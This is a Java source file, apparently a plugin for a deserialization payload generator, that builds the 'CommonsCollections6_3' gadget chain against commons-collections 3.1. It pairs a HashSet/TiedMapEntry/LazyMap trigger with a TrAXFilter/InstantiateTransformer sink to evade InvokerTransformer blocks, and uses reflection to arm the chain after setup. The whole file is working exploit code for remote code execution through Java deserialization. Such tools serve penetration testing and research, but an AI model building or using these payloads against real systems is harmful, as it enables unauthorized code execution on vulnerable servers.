package com.ar3h.plugin.fr;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import static com.ar3h.chains.common.Tag.JavaNativeDeserialize;
import static com.ar3h.chains.common.Tag.TemplatesImplChain;

/**
 * @Author se1zer
 * @Date 2024/8/17 20:49
 */
@GadgetTags(
        tags = JavaNativeDeserialize, // JavaNativeDeserialize 代表这是Java反序列化链的开始
        nextTags = TemplatesImplChain // 需要指定标签的Gadget，符合其一即可满足条件。代码中通过 gadgetChain.doCreate(gadgetContext) 获取
)
@GadgetAnnotation(
        name = "CommonsCollections6_3",
        description = "CommonsCollections6前半段 + CommonsCollections3后半段，使用 InstantiateTransformer 绕过 InvokerTransformer",
        dependencies = {"commons-collections:commons-collections:3.1"},
        authors = {"se1zer"},
        priority = 10 // 展示顺序的优先级，默认100，数字越小越优先，会在级联选择器上方优先看到
)
public class CommonsCollections6_3 implements Gadget {

    public Object getObject(Object templates) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templates } )};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);


        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
        return map;
    }

    @Override
    public Object invoke(GadgetContext gadgetContext, GadgetChain gadgetChain) throws Exception {
        Object templates = gadgetChain.doCreate(gadgetContext); // 获取下一层的gadget构建结果，也就是 templates 对象
        return getObject(templates); // 构建并返回
    }
}
